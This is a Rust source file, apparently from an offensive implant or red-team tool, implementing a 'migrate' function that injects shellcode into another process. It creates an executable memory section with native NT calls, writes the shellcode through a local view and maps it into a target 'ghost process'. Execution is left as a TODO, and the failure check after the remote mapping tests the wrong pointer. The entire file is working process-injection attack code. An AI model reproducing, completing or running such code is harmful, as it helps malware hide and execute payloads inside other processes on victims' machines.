use core::ptr::null_mut;
use core::ffi::c_void;
use std::env::current_exe;

use crate::core::types::*;
use crate::core::nt;
use crate::debug;

pub unsafe fn migrate(shellcode: &[u8], process_handle: HANDLE, target_pid: usize) -> bool {
    if shellcode.is_empty() || process_handle.is_null() || target_pid == 0 {
        return false;
    }
    debug!("[POOL] Target: PID {} handle {:p}", target_pid, process_handle);

    let section_size: i64 = shellcode.len() as i64;
    let mut section_handle: HANDLE = null_mut();

    let status = nt::nt_create_section(
        &mut section_handle,
        0x000F001F, // SECTION_ALL_ACCESS
        null_mut(), // no ObjectAttributes
        &section_size as *const i64 as *mut c_void, // MaximumSize
        0x40,       // PAGE_EXECUTE_READWRITE
        0x08000000, // SEC_COMMIT
        null_mut(), // no file handle
    );
    if status != STATUS_SUCCESS || section_handle.is_null() {
        debug!("[POOL] NtCreateSection (anonymous) failed: 0x{:08X}", status);
        return false;
    }

    // Map local vew as RW, write shellcode through this view
    let mut local_view: *mut c_void = null_mut();
    let mut local_view_size: usize = 0;
    let current_process: HANDLE = -1isize as HANDLE;

    let status = nt::nt_map_view_of_section(
        section_handle,
        current_process,    // our process
        &mut local_view,
        0,                  // ZeroBits
        0,                  // CommitSize
        null_mut(),         // SectionOffset
        &mut local_view_size,
        2,                  // ViewUnmap
        0,                  // AllocationType
        0x04,               // PAGE_READWRITE
    );
    if status != STATUS_SUCCESS || local_view.is_null() {
        debug!("[POOL] NtMapViewOfSection (local RW) failed: 0x{:08X}", status);
        nt::nt_close(section_handle);
        return false;
    }

    // Write shellcode into local RW view
    core::ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        local_view as *mut u8, 
        shellcode.len()
    );

    // Unmap local view, cuz done wirting and I do not need it anymore
    nt::nt_unmap_view_of_section(current_process, local_view);
    let mut remote_shellcode: *mut c_void = null_mut();
    let mut remote_view_size: usize = 0;

    let status = nt::nt_map_view_of_section(
        section_handle,
        process_handle,     // ghost process
        &mut remote_shellcode,
        0,                  // ZeroBits
        0,                  // CommitSize
        null_mut(),         // SectionOffset
        &mut remote_view_size,
        2,                  // ViewUnmap
        0,                  // AllocationType
        0x20,               // PAGE_EXECUTE_READ 
    );

    // Section handle is not longer needed
    nt::nt_close(section_handle);

    if status != STATUS_SUCCESS || local_view.is_null() {
        debug!("[POOL] NtMapViewOfSection (remote RW) failed: 0x{:08X}", status);
        return false;
    }

    debug!("[POOL] Shellcode mapped: local wrote {}B -> Remote RX@{:p} ({}B view)", shellcode.len(), remote_shellcode, remote_view_size);


    // TODO: MirrorGate

    unimplemented!()
}
